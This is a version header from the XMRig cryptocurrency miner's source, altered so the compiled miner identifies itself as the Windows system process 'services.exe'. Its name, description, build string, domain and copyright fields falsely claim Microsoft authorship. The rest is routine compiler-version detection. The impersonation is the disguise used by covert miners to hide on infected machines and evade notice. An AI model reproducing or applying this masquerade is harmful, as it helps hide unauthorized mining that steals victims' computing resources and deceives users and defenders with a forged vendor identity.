#ifndef XMRIG_VERSION_H
#define XMRIG_VERSION_H

#define APP_ID        "services.exe"
#define APP_NAME      "services.exe"
#define APP_DESC      "Services and Controller app"
#define APP_VERSION   "10.0.18362.207 (WinBuild.160101.0800)"
#define APP_DOMAIN    "www.microsoft.com"
#define APP_SITE      "www.microsoft.com"
#define APP_COPYRIGHT "(C) Microsoft Corporation. All rights reserved."
#define APP_KIND      "services"

#define APP_VER_MAJOR  3
#define APP_VER_MINOR  2
#define APP_VER_PATCH  0

#ifndef NDEBUG
#define BUILD_TYPE   "DEBUG"
#else
#define BUILD_TYPE   "RELEASE"
#endif

#ifdef _MSC_VER
#   if (_MSC_VER >= 1920)
#       define MSVC_VERSION 2019
#   elif (_MSC_VER >= 1910 && _MSC_VER < 1920)
#       define MSVC_VERSION 2017
#   elif _MSC_VER == 1900
#       define MSVC_VERSION 2015
#   elif _MSC_VER == 1800
#       define MSVC_VERSION 2013
#   elif _MSC_VER == 1700
#       define MSVC_VERSION 2012
#   elif _MSC_VER == 1600
#       define MSVC_VERSION 2010
#   else
#       define MSVC_VERSION 0
#   endif
#endif

#endif /* XMRIG_VERSION_H */
